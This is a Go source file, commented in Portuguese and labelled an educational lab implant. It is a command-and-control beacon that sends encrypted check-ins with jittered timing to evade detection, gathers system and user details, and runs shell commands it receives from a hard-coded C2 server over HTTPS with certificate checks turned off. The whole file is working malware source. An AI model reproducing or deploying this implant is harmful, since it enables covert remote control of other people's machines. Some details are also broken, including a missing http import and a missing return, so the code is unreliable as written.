// Implant educacional — beaconing cifrado com jitter (low and slow).
package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/seuusuario/lab-c2/internal/proto"
)

const (
	C2_URL  = "https://192.168.1.50:443/api/v1/beacon" // IP do seu Debian
	SECRET  = "chave-super-secreta-do-lab"
	SLEEP   = 15 // beacon a cada ~15s ± jitter (low and slow)
)

var sleepTime = SLEEP

func main() {
	key := proto.DeriveKey(SECRET)
	id := newID()

	// Coleta de info no primeiro check-in (T1082 — System Discovery)
	info := proto.SysInfo{
		Hostname:hostname(),
		User:currentUser(),
		OS:runtime.GOOS,
		Arch:runtime.GOARCH,
		PID:os.Getpid(),
	}

	for {
		msg := proto.Message{ID:id,Kind:"checkin",Info:info}

		// Manda resultados pendentes + recebe tasks
		var resp proto.Message
		if err := beacon(key,&msg,&resp);err !=nil {
			// Falha de rede NÃO mata o implant — tenta no próximo ciclo.
			// (resiliência básica de C2: alvo perdeu internet, C2 saiu do ar etc.)
			jitterSleep()
			continue
		}

		// Executa as tasks recebidas, guarda os resultados pro próximo beacon
		for _,task := range resp.Tasks {
			out,ok := runTask(task.Cmd)
			pending = append(pending,proto.Result{UID:task.UID,Output:out,Success:ok})
		}

		jitterSleep()
	}
}

var pending []proto.Result

// ===== beacon: envia o envelope cifrado via HTTPS =====
func beacon(key []byte,msg *proto.Message,out *proto.Message)error {
	msg.Results = pending // anexa resultados pendentes

	enc,err := proto.EncodeMessage(key,msg)
	if err !=nil {
		return err
	}

	// Skip de verificação de cert porque o nosso é self-signed (só em lab!)
	tlsCfg := &tls.Config{InsecureSkipVerify:true}
	client := &http.Client{Transport:&http.Transport{TLSClientConfig:tlsCfg}}

	resp,err := client.Post(C2_URL,"application/octet-stream",strings.NewReader(enc))
	if err !=nil {
		return err
	}
	defer resp.Body.Close()

	body,_ := io.ReadAll(resp.Body)
	return proto.DecodeMessage(key,string(body),out)
}

// ===== runTask: despacha os tipos de comando =====
func runTask(cmd string) (string,bool) {
	fields := strings.SplitN(cmd," ",2)
	switch fields[0] {
	case "shell":// executa comando no SO alvo
		if len(fields) <2 {
			return "uso: shell <cmd>",false
		}
		return shellExec(fields[1])

	case "sleep":// muda o intervalo de beaconing (controle dinâmico)
		if len(fields) <2 {
			return "uso: sleep <segundos>",false
		}
		n,err := strconv.Atoi(fields[1])
		if err !=nil ||n <1 ||n >86400 {
			return "valor inválido",false
		}
		sleepTime = n
		return fmt.Sprintf("intervalo alterado para %ds",n),true

	case "exit":
		os.Exit(0)

	default:
		return "task desconhecida: " + cmd,false
	}
}

func shellExec(cmd string) (string,bool) {
	var c *exec.Cmd
	if runtime.GOOS =="windows" {
		c = exec.Command("cmd","/C",cmd)// no Windows: cmd.exe
	}else {
		c = exec.Command("sh","-c",cmd)// no Linux: /bin/sh
	}
	var out bytes.Buffer
	c.Stdout = &out
	c.Stderr = &out
	err := c.Run()
	return out.String(),err ==nil
}

// ===== jitterSleep: dorme sleepTime ±30% — quebra a regularidade do beaconing =====
// Traffic analysis / detection de beaconing procura intervalos fixos;
// o jitter é a defesa básica e MUITO didática de documentar (T1071.001).
func jitterSleep() {
	jitter := float64(sleepTime)* 0.3
	d := float64(sleepTime)+ (rand.Float64()*2-1)*jitter
	time.Sleep(time.Duration(d * float64(time.Second)))
}

// ===== utilitários de reconhecimento =====
func newID()string {
	// ID simples baseado em hostname+user+pid — em C2 real seria derivado
	// de chave única embutida em cada build (UUID por vítima)
	b := make([]byte,16)
	rand.Read(b)
	return fmt.Sprintf("%x",b)
}

func hostname()string {
	h,err := os.Hostname()
	if err !=nil {
		return "?"
	}
	return h
}

func currentUser()string {
	if u := os.Getenv("USERNAME");u !="" {// Windows
		return u
	}
	return os.Getenv("USER")// Linux
}
